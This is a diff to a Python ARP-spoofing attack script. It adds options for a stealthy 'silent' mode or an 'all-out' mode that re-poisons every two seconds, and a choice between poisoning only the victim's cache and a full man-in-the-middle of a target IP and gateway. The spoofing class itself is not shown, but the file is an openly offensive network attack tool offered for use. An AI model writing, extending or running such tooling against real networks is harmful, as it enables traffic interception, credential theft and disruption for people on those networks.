@@ -9,7 +9,9 @@ def get_args():
     parser.add_argument("-t", "--target", dest = "target_ip", help = "IP Address of the target.")
     parser.add_argument("-g", "--gateway", dest = "gateway_ip", help = "IP Address of the Gateway.")
     parser.add_argument("-ip", "--localip", dest = "local_ip", help = "IP Address of the Attacker.")
-    parser.add_argument("-i", "--interface", dest = "interface", help = "Interface.")
+    parser.add_argument("-i", "--interface", dest = "interface", help = "The interface to use for the attacks.")
+    parser.add_argument("-s", "--silent", dest = "silent", help = "Choose between silent or 'all-out' mode. Answer with 'y' or 'n', default 'y'")
+    parser.add_argument("-m", "--mitm", dest = "mitm", help = "Poison only the victim's cache or perform a Man-in-the-Middle (y|n)")
     options = parser.parse_args()
     if not options.target_ip:
         parser.error("[-] MISSING PARAMETER '-t' (target IP), use --help for more info.")
@@ -21,9 +23,23 @@ def get_args():
     if not options.local_ip:
         options.local_ip = 0
         print("Attacker IP not defined, will calculate IP later")
+    if not options.silent:
+        options.silent = True
+    else:
+        if 'y' in options.silent:
+            options.silent = True
+        else:
+            options.silent = False
+    if not options.mitm:
+        options.mitm = False
+    else:
+        if 'y' in options.mitm:
+            options.mitm = True
+        else:
+            options.mitm = False
     return options
 
-def ARPSpoof(victim_ip, gateway_ip, interface, attacker_ip, n_times = 0):
+def ARPSpoof(victim_ip, gateway_ip, interface, attacker_ip, silent = True, mitm = False, n_times = 0):
     if attacker_ip == 0:
         hostname = socket.gethostname()
         attacker_ip = socket.gethostbyname(hostname)
@@ -37,8 +53,11 @@ def ARPSpoof(victim_ip, gateway_ip, interface, attacker_ip, n_times = 0):
     arp = ARP(attacker, victim, gateway, interface)
     if n_times <= 0:
         while True:
-            arp.spoof(mitm=True)
-            time.sleep(300)
+            arp.spoof(mitm)
+            if silent:
+                time.sleep(300)
+            else:
+                time.sleep(2)
     else:
         arp.spoof()
 
@@ -49,9 +68,13 @@ if __name__ == '__main__':
     gateway_ip = options.gateway_ip
     interface = options.interface
     attacker_ip = options.local_ip
+    silent = options.silent
+    mitm = options.mitm
 
     ARPSpoof(target_ip,
         gateway_ip,
         interface,
-        attacker_ip
+        attacker_ip,
+        silent,
+        mitm
     )
